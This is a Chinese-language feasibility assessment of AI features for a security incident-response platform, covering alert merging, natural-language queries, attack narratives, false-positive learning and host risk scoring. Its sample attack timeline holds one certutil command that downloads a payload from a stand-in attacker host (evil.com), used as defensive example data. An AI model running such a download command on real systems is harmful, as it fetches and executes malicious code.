# 应急平台 × AI 高级关联功能 — 应急专家可行性评估

> 评估人：小卓（AI 渗透测试专家）
> 基准版本：IR Platform v0.7（Agent 常驻 + 157 条规则 + RAG + 攻击链 + 1.6w+ 范式化日志 + 策略引擎）

---

## 总体判断

**文档 16 项功能均"长在当前底座上"的判断成立。** 平台已有 Agent 采集管道、RAG 语义分析、攻击链引擎、范式化日志、策略配置系统——不是空中楼阁。

从应急专家角度看，最具落地价值的顺序不是"惊艳度×可行性"，而是 **"能否解决分析师每天面对的实际痛点"**。

---

## TOP 5 可行功能（优化排序）

---

### 🥇 功能一：语义级告警降噪与事件归并

#### 功能描述

将当前告警中心的 187 条告警（实际由 16,700+ 条日志命中 150 条规则产生）用 LLM 做语义归并：识别同一攻击事件的不同环节告警，自动聚合成一条"事件"。

```
原始: 20 条告警（4625×8 + 4688×5 + 5156×3 + 1102×1 + ...）
降噪后: 1 条事件 → "2026-07-13 暴破→横向移动→凭证窃取→外连C2"
```

#### 技术可行性 — ✅ 高

| 依赖 | 现状 | 缺口 |
|:-----|:-----|:-----|
| 规则命中数据 | 已有 alerts 表 187 条告警 | 无 |
| 时间窗口 | 已有 timestamp、first_seen_at、last_seen_at | 无 |
| 攻击链关联 | 已有 attack_chain 规则和关联引擎 | 无 |
| 主机上下文 | 已有 hosts 表 | 无 |
| LLM 推理 | 已有 `KnowledgeRetriever` 三维检索 + RAG 管道 | 需引入 LLM 聊天模型做语义聚类 |

#### 适配方案

在现有 `correlate_incident` 引擎后叠加一层 LLM 语义归并：

```
规则命中 → correlate_incident（现有规则聚合）
                → LLM 语义归并（新增）
                     → 事件（单条，含解释文本）
                          → 告警中心（替代原本的 20 条告警）
```

```
POST /api/ai/correlate-incidents
  输入: 时间窗口、主机ID、关联告警列表
  输出: {incidents: [{title, description, severity, related_alerts, kill_chain_steps}]}
```

#### 核心亮点

- **告警量降 80%+**：187 条告警归并为 10-15 次事件，分析师真正需要关注的事件量
- **每条事件都有"故事"**：不再是孤立的 `4625×8`，而是 `[暴破→成功登录→横向移动]` 的完整叙事
- **基于现有引擎，改动极小**：`correlate_incident` 已有规则聚合能力，只需加 LLM 语义层

---

### 🥈 功能二：自然语言指挥台

#### 功能描述

用户用自然语言直接问平台要结论，无需翻菜单、写 SQL、点页面。

```
"昨天 WEB-SRV-01 发生了什么事？"
  → "07/12 09:30 发现管理员从 192.168.1.200 登录，
     随后 certutil 下载 payload.exe，09:35 外连 203.0.113.42:443。
     攻击路径: 暴破→下载执行→C2。建议: 隔离主机、查杀 payload.exe。"

"哪些主机的登录失败次数最多？"
  → "TOP 3: WEB-SRV-01(230次), DB-01(67次), APP-01(12次)"
```

#### 技术可行性 — ✅ 高

| 依赖 | 现状 | 缺口 |
|:-----|:-----|:-----|
| 检索层 | 已有完整 REST API | 需 NL→结构化查询网关 |
| 数据源 | 已有 alerts / logs / cases / hosts | 无 |
| 语义理解 | 已有 `KnowledgeRetriever` 三维检索 | 需意图识别 + 参数提取 |
| 前端 | 已有对话式 UI 基础（AI 分析页面） | 需新对话组件 |

#### 适配方案

核心架构是 **NL→结构化查询网关**，不改造现有 API：

```
用户输入 → 意图识别（LLM）→ SQL/API 参数提取 → 执行查询 → 结果摘要（LLM）
```

自然语言检索层：

| 用户意图 | 映射到 API | 示例 |
|:---------|:----------|:-----|
| 查询告警 | `GET /api/alerts?severity=critical&date_from=...` | "今天有哪些严重告警" |
| 日志检索 | `GET /api/logs/search?event_type=failed_logon&host_id=5` | "WEB 服务器登录失败" |
| 主机状态 | `GET /api/agents/online-status` | "哪些主机离线了" |
| 案件查询 | `GET /api/cases` | "未结案的事件" |
| 攻击链分析 | `GET /api/analysis/result/{host_id}` | "这台机器被攻击了吗" |

#### 核心亮点

- **演示效果最炸裂**：张口问"这台机器有什么问题"→秒出结论，比任何 UI 点击都直观
- **覆盖 80% 日常查询**：告警查询、日志检索、主机状态、威胁情报——分析师 80% 的操作是查数据
- **接入成本低**：不改造 API，只加 NL→查询参数翻译层

---

### 🥉 功能三：攻击故事自动讲述 + 一键复盘报告

#### 功能描述

基于时间线 + MITRE + 攻击链数据，自动生成一段"案发故事"和一份可直接交付的复盘报告。

```
时间线数据:
  08:45  4672  管理员登录（来源: 192.168.1.200）
  08:47  4688  计划任务创建 (schtasks.exe)
  08:50  4688  certutil.exe -urlcache http://evil.com/payload.exe
  08:52  4688  payload.exe 执行
  08:55  5156  外连 203.0.113.42:443
  09:20  1102  🚨 审计日志清除

AI 生成的故事:
"攻击者于 08:45 通过暴破获取管理员权限（来源 192.168.1.200），
登录后立即创建计划任务持久化，08:50 使用 certutil 下载恶意载荷。
payload.exe 执行后于 08:55 建立 C2 通信（203.0.113.42:443）。
09:20 攻击者清理审计日志，试图掩盖痕迹。
攻击覆盖 MITRE T1078/T1053/T1105/T1071/T1070。

建议: 立即隔离主机，对 192.168.1.200 展开全面排查。"
```

#### 技术可行性 — ✅ 高

| 依赖 | 现状 | 缺口 |
|:-----|:-----|:-----|
| 时间线 | ✅ 已有 TimelineEvent + built events | 无 |
| MITRE ATT&CK | ✅ 每条告警/规则都标注了 MITRE ID | 无 |
| 攻击链 | ✅ 已有 attack_chain 关联引擎 | 无 |
| 主机上下文 | ✅ hosts / profiles | 无 |
| 报告模板 | ✅ 已有 report 模块 | 需 LLM 叙事填充 |
| LLM 生成 | 已有 KnowledgeRetriever | 需摘要生成能力 |

#### 适配方案

复用现有 `ReportView.vue` + 新增 AI 故事面板：

```python
# POST /api/ai/narrate-incident
# 输入: {case_id, host_id, time_range}
# 输出: {story: "攻击者于...", mitre_summary: [...], recommendations: [...]}

def narrate_incident(case_id):
    timeline = TimelineEvent.get_by_case(case_id)
    attack_chain = AttackChainResult.get_by_case(case_id)
    alerts = Alert.get_by_case(case_id)
    context = format_context(timeline, attack_chain, alerts)
    story = llm.generate(f"基于以下安全事件时间线，用中文生成攻击故事...", context)
    return story
```

#### 核心亮点

- **复盘报告零时差**：处置完成时报告已生成，无需分析师额外写报告
- **从"数据"到"叙事"的跃迁**：大领导不需要看时间线表格，要的是"告诉我发生了什么"
- **两功能合一**：故事讲述 + 报告生成共享同一 LLM 上下文，一次推理出两份产出

---

### 🏅 功能四：智能误报自学习

#### 功能描述

分析师在告警中心标记"误报"后，系统自动识别同类规则/同类场景，下次自动收敛。

```
分析师操作: 告警 → 标记为误报（注明理由: "这是运维脚本定期执行"）
系统学习: 
  规则 EVT-001 + 源进程 "backup_script.exe" = 误报模式
下次命中: 自动降级为 info，不产生告警，只在详情页记录
```

#### 技术可行性 — ✅ 高

| 依赖 | 现状 | 缺口 |
|:-----|:-----|:-----|
| 告警标记 | `dismiss(reason)` 已有 | 需新增"误报"状态 |
| 告警上下文 | 告警包含 hostname/process_name/rule_name | 无 |
| 自学习规则 | 已有 RuleEngine + rule_suppression | 需误报模式匹配表 |
| 白名单 | 已有 whitelist 表 | 可复用 |

#### 适配方案

最小改动：在告警中心加"标记为误报"按钮 → 写入 `rule_suppression` 表 → 下次相同模式自动过滤。

```
告警被标记误报 → 提取 {rule_name, source_process, source_ip, host_id}
                → 写入误报模式表
                → RuleEngine 执行时检查误报模式
                → 匹配则不产生告警（或降级为 info）
```

新增一张表：

```sql
CREATE TABLE IF NOT EXISTS false_positive_patterns (
    id              INTEGER PRIMARY KEY AUTOINCREMENT,
    rule_name       TEXT,
    source_process  TEXT,
    source_ip       TEXT,
    host_id         INTEGER,
    reason          TEXT,
    created_by      TEXT,
    hit_count       INTEGER DEFAULT 0,
    created_at      TEXT NOT NULL DEFAULT (datetime('now'))
);
```

#### 核心亮点

- **解决告警疲劳最直接的手段**：分析师标记一次，同类不再报警
- **平台越用越聪明**：使用时间越长误报越少，是"自进化"的第一步
- **改动极小**：基于现有 `dismiss` + `whitelist` 能力延伸，核心逻辑 50 行代码

---

### 🏅 功能五：预测性沦陷预警（精简版）

#### 功能描述

基于主机画像 + 历史告警 + 行为趋势，对每个主机输出"沦陷风险评分"，用排行榜展示最可能出问题的主机。

```
主机沦陷风险 TOP 5:
  🚨 WEB-SRV-01  风险分: 87/100  → 登录失败激增 + 可疑外连 + 进程异常
  🟡 DB-01       风险分: 62/100  → 非工作时间登录 + 权限变更
  🟡 APP-01      风险分: 45/100  → 弱密码登录
```

#### 技术可行性 — ✅ 中高

| 依赖 | 现状 | 缺口 |
|:-----|:-----|:-----|
| 主机画像 | ✅ ProfileBuilder 已有 | 需扩充评分维度 |
| 告警趋势 | ✅ 已有 alert trend | 无 |
| 异常检测 | ✅ AnomalyDetector 已有 | 需归一化评分 |
| 历史时间线 | ✅ TimelineEvent 已有 | 无 |
| 图神经网络 | ❌ 未引入 | 可绕行：用加权评分代替 |

#### 适配方案

**不使用 GNN，采用轻量加权评分模型**（逻辑回归级别的简单性）：

```python
RISK_WEIGHTS = {
    "failed_logon_burst":    25,  # 登录失败暴增
    "audit_log_cleared":     30,  # 审计日志清除（铁证）
    "new_service_installed": 20,  # 新服务
    "powershell_encoded":    25,  # PS 编码执行
    "unknown_outbound":      20,  # 未知外连
    "offline_duration":      10,  # 离线时长
    "no_recent_scan":        5,   # 长时间未分析
}

def calculate_host_risk(host_id):
    score = 0
    score += check_failed_logon_trend(host_id) * 25
    score += check_audit_clear(host_id) * 30
    score += check_abnormal_process(host_id) * 25
    ...
    return min(score, 100)
```

前端新增 **`RiskRankView.vue`** 展示风险排行 + 趋势图。

#### 核心亮点

- **最有前瞻性的能力**：从"事后止血"到"事前预警"，安全团队看向未来的窗口
- **不依赖 ML 模型也能落地**：加权评分方案 1 天可上线，后续可升级为 GNN
- **直接产出可执行动作**：高评分主机的建议是一个明确的"排查优先级列表"

---

## 实施建议

### 推荐顺序（按投入产出比）

| 阶段 | 功能 | 预估工作量 | 惊艳度 |
|:----|:-----|:---------:|:------:|
| **第1批** | ① 语义降噪 | 2 天 | ⭐⭐⭐⭐⭐ |
| | ④ 误报自学习 | 1 天 | ⭐⭐⭐ |
| **第2批** | ② 自然语言指挥台 | 3 天 | ⭐⭐⭐⭐⭐ |
| | ③ 攻击故事+报告 | 2 天 | ⭐⭐⭐⭐ |
| **第3批** | ⑤ 预测预警 | 2 天 | ⭐⭐⭐⭐⭐ |

### 为什么要先从降噪开始

应急分析师每天面对**告警疲劳**——200 条告警里 180 条是噪音。不先解决这个问题，告警中心永远是个"虽然数据很多但真正要看的没几条"的状态。

语义降噪 + 误报自学习同时落地后，告警量预计降 85%+，分析师才真正有精力关注那 15% 的真实告警——这时自然语言指挥台和攻击故事才有了真正的"故事素材"。
